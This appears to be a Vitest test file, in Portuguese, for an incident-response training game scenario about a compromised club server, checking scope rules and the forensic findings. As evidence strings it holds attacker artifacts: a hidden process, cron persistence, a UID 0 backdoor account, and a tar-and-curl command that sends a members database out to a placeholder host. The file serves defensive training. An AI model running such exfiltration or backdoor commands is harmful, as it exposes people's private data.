import { describe, expect, it } from 'vitest';
import { peDeMoleque } from '../src/cenarios/pe_de_moleque';
import { violacoes } from '../src/motor/escopo';
import { faixaDaTela } from '../src/som/faixas';

const a1 = (id: string) => peDeMoleque.ato1!.achados.find((a) => a.id === id)!;
const a3 = (id: string) => peDeMoleque.ato3!.achados.find((a) => a.id === id)!;

describe('Pé de Moleque: escopo e revide', () => {
  it('servidores do invasor são fora do escopo; o do clube é dentro', () => {
    const esc = peDeMoleque.escopo!;
    expect(violacoes('nmap 198.51.100.66', esc)).toHaveLength(1);
    expect(violacoes('curl http://198.51.100.66/up/', esc)).toHaveLength(1);
    expect(violacoes('ping 203.0.113.66', esc)).toHaveLength(1);
    expect(violacoes('ssh -i ~/.ssh/id_auditor auditor@10.30.0.15', esc)).toEqual([]);
    expect(violacoes('grep 198.51.100.66 evidencias/conexoes.txt', esc)).toEqual([]);
  });

  it('tem faixa própria na trilha sonora', () => {
    expect(faixaDaTela('mesa', 'pe_de_moleque')).toBe('varredura_noturna');
  });
});

describe('Pé de Moleque: triagem', () => {
  it('cada achado aceita a evidência real do servidor', async () => {
    expect((await a1('pdm-processo').validar('admin  /bin/sh /tmp/.x/kworkerd')).ok).toBe(true);
    expect((await a1('pdm-conexao').validar('ESTAB 0 0 10.30.0.15:41234 198.51.100.66:3333')).ok).toBe(true);
    expect((await a1('pdm-persistencia').validar('*/10 * * * * /tmp/.x/kworkerd | ssh-ed25519 AAAA... x@vps')).ok).toBe(true);
    expect((await a1('pdm-conta').validar('suporte:x:0:0::/home/suporte:/bin/sh')).ok).toBe(true);
    expect((await a1('pdm-linha').validar('46 falhas de 203.0.113.66; Nov 19 03:42:07 Accepted password for admin')).ok).toBe(true);
    expect((await a1('pdm-exfil').validar('sudo tar czf /tmp/.x/s.tgz /var/backups/socios.sql; curl -s -T /tmp/.x/s.tgz http://198.51.100.66/up/')).ok).toBe(true);
    expect((await a1('pdm-ioc').validar('79c5de196826beb9b947b0381ac71d2560451c605c2bb8e30dc656f5366d8857  /tmp/.x/kworkerd')).ok).toBe(true);
  });

  it('linha do tempo exige IP, tentativas e horário', async () => {
    expect((await a1('pdm-linha').validar('203.0.113.66')).ok).toBe(false);
  });
});

describe('Pé de Moleque: relatório e verificação', () => {
  it('relatório de incidente não usa CVSS', () => {
    for (const i of peDeMoleque.ato2!.itens) expect(i.cvss, i.achado).toBeNull();
    for (const p of peDeMoleque.ato2!.reuniao) expect(p.alternativas.filter((x) => x.certa)).toHaveLength(1);
  });

  it('a conta UID 0 continua depois da limpeza', async () => {
    expect(a3('pdm-rt-conta').status).toBe('nao');
    expect((await a3('pdm-rt-conta').validar('suporte:x:0:0::/home/suporte:/bin/sh')).ok).toBe(true);
    expect((await a3('pdm-rt-processo').validar("ls: /tmp/.x: No such file or directory")).ok).toBe(true);
    expect((await a3('pdm-rt-persistencia').validar('ssh-ed25519 AAAA... wanderson@notebook-ti')).ok).toBe(true);
  });

  it('sem travessão nos textos', () => {
    expect(JSON.stringify(peDeMoleque)).not.toMatch(/[\u2013\u2014]/);
  });
});
